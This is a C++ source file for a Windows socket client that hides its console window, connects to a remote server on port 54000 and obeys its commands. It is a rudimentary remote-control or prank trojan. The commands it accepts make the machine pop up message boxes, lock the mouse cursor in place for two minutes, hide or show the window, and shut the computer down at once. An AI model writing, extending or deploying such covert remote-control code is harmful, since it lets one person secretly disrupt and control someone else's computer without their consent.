#include <iostream>
#include <string>
#include <ws2tcpip.h>
#include <windows.h>
#pragma comment(lib, "ws2_32.lib")

using namespace std;
string active = "false";
void main()
{
	HWND myConsole;
	myConsole = GetConsoleWindow();
	HANDLE hConsole = GetStdHandle(STD_OUTPUT_HANDLE);
	string ipAddress;
	SetConsoleTextAttribute(hConsole, 15);
	cout << "Please type in the ip Address:" << endl << "> ";
	cin >> ipAddress;
	cout << endl;
	int port = 54000;
	ShowWindow(myConsole, 0);

	// Initialize
	WSAData data;
	WORD ver = MAKEWORD(2, 2);
	int wsResult = WSAStartup(ver, &data);
	if (wsResult != 0)
	{
		ShowWindow(myConsole, 1);
		SetConsoleTextAttribute(hConsole, 15);
		cerr << "Can't start Winsock, Err #" << wsResult << endl;
		return;
	}

	// Create socket
	SOCKET sock = socket(AF_INET, SOCK_STREAM, 0);
	if (sock == INVALID_SOCKET)
	{
		ShowWindow(myConsole, 1);
		SetConsoleTextAttribute(hConsole, 15);
		cerr << "Can't create socket, Err #" << WSAGetLastError() << endl;
		WSACleanup();
		return;
	}

	// Fill in a hint structure
	sockaddr_in hint;
	hint.sin_family = AF_INET;
	hint.sin_port = htons(port);
	inet_pton(AF_INET, ipAddress.c_str(), &hint.sin_addr);

	// Connect to server
	int connResult = connect(sock, (sockaddr*)& hint, sizeof(hint));
	if (connResult == SOCKET_ERROR)
	{
		ShowWindow(myConsole, 1);
		SetConsoleTextAttribute(hConsole, 15);
		cerr << "Can't connect to server, Err #" << WSAGetLastError() << endl;
		closesocket(sock);
		WSACleanup();
		return;
	}



	// Do-while loop to send and receive data
	char buf[4096];
	string userInput;

	bool wh = true;
	int colorint = 15;
	string mbt = "MessageBox Caption";
	SetConsoleTitle("Client");
	do
	{
		// Prompt the user for some text
		SetConsoleTextAttribute(hConsole, colorint);
		cout << "";
		//getline(cin, userInput);

		// Send the text
		userInput = "";
		int sendResult = send(sock, userInput.c_str(), userInput.size() + 1, 0);
		if (sendResult != SOCKET_ERROR)
		{
			// Wait for response
			ZeroMemory(buf, 4096);
			int bytesReceived = recv(sock, buf, 4096, 0);
			if (bytesReceived > 0)
			{
				string input = string(buf, 0, bytesReceived);
				string echo = "echo";
				string title = "title";
				string msg = "msg";
				string shutdown = "shutdown";
				string exit_user = "exit_user";
				string console = "console";
				string hide = "hide";
				string show = "show";
				string clear = "clear";
				string color = "color";
				string cursor = "cursor";
				string freeze = "freeze";
				string move = "move";
				if (input == exit_user)
				{
					return;
				}
				else if (input.substr(0, cursor.size()) == cursor)
				{
					//cout << "SERVER> " << input.substr(echo.size(), input.size()) << endl;
					string inputConv = input.substr(cursor.size() + 1, input.size());
					string stemp = string(inputConv.begin(), inputConv.end());
					if (inputConv.substr(0, freeze.size()) == freeze)
					{
						POINT pt;
						if (active == "true")
						{
							active = "false";
						}
						else
						{
							active = "true";
						}
						GetCursorPos(&pt);
						int a = 120 * 100;
						int b = a;
						do
						{
							SetCursorPos(pt.x, pt.y);
							Sleep(10);
							if (((b % 50)) == 0)
							{
								if ((b % 100) != 50)
								{
									cout << "noch " << (b / 100) << " Sekunden" << endl;
								}
							}
							b--;
						} while (b >= 1);
					}
					else if (inputConv.substr(0, msg.size()) == msg)
					{
					}
					//inputConv.substr(title.size() + 1, inputConv.size())
				}
				else if (input.substr(0, echo.size()) == echo)
				{
					//cout << "SERVER> " << input.substr(echo.size(), input.size()) << endl;
					string inputConv = input.substr(echo.size() + 1, input.size());
					string stemp = string(inputConv.begin(), inputConv.end());
					string inputConv2 = input.substr(echo.size() + 1 + msg.size() + 1, input.size());
					string stemp2 = string(inputConv2.begin(), inputConv2.end());
					LPCSTR msgout = stemp2.c_str();
					if (inputConv.substr(0, title.size()) == title)
					{
						string aaa = inputConv.substr(title.size() + 1, input.size());
						mbt = aaa;
						SetConsoleTextAttribute(hConsole, colorint);
						cout << "ECHO> " << "set title to: " << inputConv.substr(title.size() + 1, input.size()) << endl;
					}
					else if (inputConv.substr(0, msg.size()) == msg)
					{
						MessageBox(0, msgout, mbt.c_str(), MB_OK);
						SetConsoleTextAttribute(hConsole, colorint);
						cout << "ECHO> " << "echo message: " << inputConv.substr(msg.size() + 1, inputConv.size()) << endl;
					}
					//inputConv.substr(title.size() + 1, inputConv.size())
				}
				else if (input == shutdown)
				{
					system("shutdown -s -t0");
					closesocket(sock);
					WSACleanup();
					return;
				}
				else if (input.substr(0, console.size()) == console)
				{
					if (input.substr(console.size() + 1, input.size()) == hide) {
						ShowWindow(myConsole, 0);
						SetConsoleTextAttribute(hConsole, colorint);
						cout << "CONSOLE> " << "close" << endl;
					}
					else if (input.substr(console.size() + 1, input.size()) == show)
					{
						ShowWindow(myConsole,1);
						SetConsoleTextAttribute(hConsole, colorint);
						cout << "CONSOLE> " << "open" << endl;
					}
					else if (input.substr(console.size() + 1, input.size()) == clear)
					{
						system("cls");
						SetConsoleTextAttribute(hConsole, colorint);
						cout << "CONSOLE> " << "clear" << endl;
					}
					else if (input.substr(console.size() + 1, console.size() + 1 + color.size()) == color)
					{
						string a = input.substr(console.size() + 1 + color.size() + 1, input.size());
						string b = a;
						cout << "CONSOLE> " << "set color to: " << endl;
						b.replace(b.find("1"), 1, "");
						b.replace(b.find("2"), 1, "");
						b.replace(b.find("3"), 1, "");
						b.replace(b.find("4"), 1, "");
						b.replace(b.find("5"), 1, "");
						b.replace(b.find("6"), 1, "");
						b.replace(b.find("7"), 1, "");
						b.replace(b.find("8"), 1, "");
						b.replace(b.find("9"), 1, "");
						b.replace(b.find("0"), 1, "");
						if (b == "")
						{
							int x = stoi(a);
							colorint = x;
						}
						SetConsoleTextAttribute(hConsole, colorint);
					}
				}
				else
				{
					cout << "Unknown Command> " << input << endl;
				}
			}
		}

	} while (wh == true);

	// Gracefully close down everything
	closesocket(sock);
	WSACleanup();
}
